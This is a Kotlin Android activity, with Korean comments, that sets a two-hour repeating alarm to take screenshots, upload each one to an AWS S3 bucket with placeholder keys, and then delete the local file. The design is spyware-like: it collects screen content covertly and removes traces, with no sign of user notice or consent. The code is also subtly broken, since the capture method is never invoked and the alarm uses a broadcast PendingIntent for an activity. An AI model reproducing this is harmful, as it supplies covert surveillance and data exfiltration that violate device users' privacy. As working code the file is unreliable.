package com.project.mfp

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.amazonaws.auth.BasicAWSCredentials
import com.amazonaws.services.s3.AmazonS3Client
import com.amazonaws.services.s3.model.PutObjectRequest
import com.project.mfp.R
import java.io.File
import java.io.FileOutputStream

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        scheduleScreenCapture()
    }

    private fun captureScreen() {
        // 화면 캡처 수행
        val rootView = window.decorView.rootView
        rootView.isDrawingCacheEnabled = true
        val bitmap = Bitmap.createBitmap(rootView.drawingCache)
        rootView.isDrawingCacheEnabled = false

        // 캡처한 이미지 저장
        val fileName = "screenshot_${System.currentTimeMillis()}.png"
        val file = File(getExternalFilesDir(null), fileName)
        val fos = FileOutputStream(file)
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos)
        fos.flush()
        fos.close()

        // 캡처한 이미지를 AWS 서버로 전송
        uploadImageToServer(file)
    }

    private fun uploadImageToServer(file: File) {
        // AWS S3 클라이언트 초기화
        val s3Client = AmazonS3Client(BasicAWSCredentials("ACCESS_KEY", "SECRET_KEY"))

        // 파일 업로드
        val putRequest = PutObjectRequest("BUCKET_NAME", file.name, file)
        s3Client.putObject(putRequest)

        // 업로드 완료 후 기기에서 이미지 삭제
        file.delete()
    }

    private fun scheduleScreenCapture() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, 0)

        // 2시간마다 화면 캡처 수행
        alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis(),
                2 * 60 * 60 * 1000,
                pendingIntent
        )
    }
}